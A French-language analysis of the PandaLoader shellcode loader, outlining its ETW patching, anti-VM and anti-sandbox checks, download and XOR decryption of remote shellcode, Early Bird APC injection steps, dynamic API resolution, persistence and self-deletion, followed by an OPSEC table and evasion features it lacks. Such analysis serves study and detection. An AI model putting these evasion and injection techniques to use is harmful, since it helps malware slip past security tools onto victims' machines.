https://github.com/chainski/PandaLoader
### 1. Anti-analyse (`junk_code`)

Une boucle de calculs inutiles — son seul but est de faire perdre du temps à un sandbox qui analyse le binaire avec un timeout court.

### 2. ETW Patching (`ETWPATCH`)

Patch les fonctions `EtwEventWrite`, `EtwEventWriteTransfer`, etc. dans `ntdll.dll` avec `xor rax, rax; ret` — elles retournent immédiatement sans rien loguer. C'est une des techniques dont je t'avais parlé : ça aveugle Windows Event Tracing, utilisé par certains EDR pour la télémétrie interne.

### 3. Checks optionnels

- **Admin check** : si besoin admin et pas admin → relance via `Start-Process -Verb runAs`
- **Mutex** (`SINGLE_INSTANCE`) : une seule instance à la fois
- **AntiVM** : vérifie < 104 processus, < 6 Go RAM, drivers VMware/VirtualBox, processus comme `wireshark.exe`, `processhacker.exe`, etc. → `ExitProcess` si VM détectée
- **Sleep delay** : attend 10-16 secondes avec une boucle CPU active (pas `Sleep()`, pour tromper les sandboxes qui accélèrent le temps)

### 4. Téléchargement + déchiffrement du shellcode

```
HTTP GET sur SHELLCODE_URL → XOR decrypt avec XOR_DECRYPTION_KEY → payload en mémoire
```

Le shellcode n'est pas embarqué dans le binaire — il est téléchargé au runtime depuis une URL. Ça rend l'analyse statique du binaire inutile.

### 5. Injection (Early Bird APC)

```cpp
CreateProcess(TARGET, ..., CREATE_SUSPENDED)  // spawn suspendu
VirtualAllocEx(RWX)                           // alloue mémoire
WriteProcessMemory(shellcode)                 // écrit shellcode
VirtualProtect(RX)                            // flip vers RX
QueueUserAPC(shellcode, mainThread)           // queue APC
ResumeThread                                  // déclenche l'APC
```

### 6. Résolution dynamique des fonctions

Toutes les fonctions sensibles sont résolues via `GetProcAddress` au lieu d'être importées statiquement :

```cpp
(WriteProcessMemoryFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory")
```

Combiné avec `OBF()` (obfuscation des strings), les strings `"VirtualAllocEx"`, `"WriteProcessMemory"` n'apparaissent pas en clair dans le binaire — ça contourne la détection statique par IAT.

### 7. Persistence + autodestruction (optionnels)

- Copie dans `ProgramData\DIRECTORY_NAME\`, crée une tâche planifiée au logon
- `MELT` : se supprime après injection via `cmd /C choice ... & Del <exe>`

---

## Résumé des techniques OPSEC présentes

|Technique|Présent|
|---|---|
|ETW patching|Oui|
|AntiVM|Oui|
|Sleep anti-sandbox|Oui|
|Shellcode distant (pas embarqué)|Oui|
|XOR chiffrement|Oui|
|Résolution dynamique + string obfuscation|Oui|
|RWX → RX flip|Oui (mais alloue RWX d'abord)|
|Persistence|Optionnel|

Un loader solide pour un projet GitHub public. Ce qu'il ne fait pas : unhooking ntdll, syscalls directs, module stomping.
